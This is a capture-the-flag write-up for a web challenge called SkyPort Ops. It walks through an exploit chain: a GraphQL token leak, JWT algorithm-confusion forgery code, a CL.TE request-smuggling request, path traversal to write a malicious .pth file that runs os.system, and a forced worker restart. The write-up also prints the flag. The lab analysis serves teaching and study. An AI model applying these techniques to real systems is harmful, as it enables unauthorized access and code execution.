# SkyPort Ops

**Category:** Web  
**Source:** t-of-me.github.io  
**Difficulty:** Medium (250 pts, 130 solves)  
**Flag:** `0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}`

## Challenge Summary

SkyPort Ops was an airport operations portal that was supposedly accessible only to Security Officers. The challenge was not a single-bug solve. Instead, it required chaining together multiple bugs until full code execution was achieved and the flag was written into a web-accessible location.

## Exploit Chain Overview

The full chain was:

1. Leak a staff JWT through GraphQL Relay.
2. Extract the RSA public key.
3. Forge an admin JWT through algorithm confusion.
4. Smuggle a request past the gateway.
5. Abuse path traversal in the upload endpoint.
6. Execute a malicious `.pth` file when workers restart.

## Step 1 — Leak a Staff JWT via GraphQL Relay

The `StaffNode` type exposed an `accessToken` field. Because the backend used Strawberry Relay, objects could be queried by a global Relay ID.

For user ID `2`, the Relay ID was:

```text
base64("StaffNode:2") = U3RhZmZOb2RlOjI=
```

Using that ID in the `node` query leaked `officer_chen`'s token:

```graphql
{
  node(id: "U3RhZmZOb2RlOjI=") {
    ... on StaffNode {
      username
      accessToken
    }
  }
}
```

This gave a valid staff JWT and opened the rest of the attack chain.

## Step 2 — Extract the RSA Public Key

After decoding the JWT, its payload contained a `jwks_uri` field pointing to an internal path like `/api/<random_hex>`. Requesting that endpoint returned the RSA public key in PEM format.

That key became useful in the next stage, where the JWT verification code could be tricked into accepting a forged token.

## Step 3 — Forge an Admin JWT with Algorithm Confusion

The vulnerable JWT decode logic looked like this:

```python
jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)
```

Because `algorithms=None`, the server did not lock verification to the intended asymmetric algorithm. That allowed the attacker to create a JWT with header `alg: HS256` and sign it using the RSA public key DER bytes as the HMAC secret.

```python
admin_token = jose_jwt.encode(
    {"sub": "admin", "role": "admin"},
    der_bytes,
    algorithm="HS256"
)
```

The server incorrectly accepted that token as valid, which effectively granted admin access.

## Step 4 — Bypass the Gateway with CL.TE Request Smuggling

The frontend SecurityGateway blocked requests to `/internal/*`, so direct access to internal admin routes was not possible.

The bypass used a CL.TE desynchronization:

- the gateway trusted `Content-Length`
- the backend trusted `Transfer-Encoding: chunked`

A smuggled second request was hidden in the body so the backend processed it but the gateway never inspected it.

```http
POST / HTTP/1.1
Content-Length: <total>
Transfer-Encoding: chunked

0


POST /internal/upload HTTP/1.1
Authorization: Bearer <admin_token>
...multipart body with malicious file...
```

That let the attacker reach the internal upload functionality with the forged admin token.

## Step 5 — Path Traversal and `.pth` Injection

The upload handler trusted filenames too much. If the uploaded filename started with `/`, it treated it as an absolute path:

```python
if filename.startswith("/"):
    destination = Path(filename)
```

That meant arbitrary file write. The uploaded target path was:

```text
/home/skyport/.local/lib/python3.11/site-packages/evil.pth
```

The payload written into that file was:

```python
import os; os.system('/flag > /tmp/skyport_uploads/flag.txt')
```

Python automatically executes `.pth` files from `site-packages` at interpreter startup, which turned the file write into code execution once the worker restarted.

## Step 6 — Trigger Worker Restart

Hypercorn was running with `--max-requests 100`. By sending more than 200 requests, both workers eventually restarted.

On restart, Python processed the malicious `.pth` file, executed the command, and wrote the output of the SUID `/flag` binary into a web-accessible file.

```text
GET /uploads/flag.txt
```

That returned:

```text
0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

## Why the Chain Worked

Each vulnerability unlocked the next one:

- GraphQL Relay exposed a valid user token.
- JWT confusion turned that foothold into admin access.
- Request smuggling bypassed the gateway.
- Path traversal created arbitrary file write.
- `.pth` loading converted file write into code execution.
- Worker restart triggered the payload.

## Vulnerability Summary

| Step | Vulnerability | Impact |
|------|---------------|--------|
| 1 | GraphQL Relay IDOR | Leak staff JWT |
| 2 | Public JWKS exposure | Needed for JWT forgery |
| 3 | JWT algorithm confusion | Forge admin token |
| 4 | CL.TE request smuggling | Reach internal admin routes |
| 5 | Path traversal in upload | Arbitrary file write |
| 6 | Python `.pth` execution | RCE on worker restart |
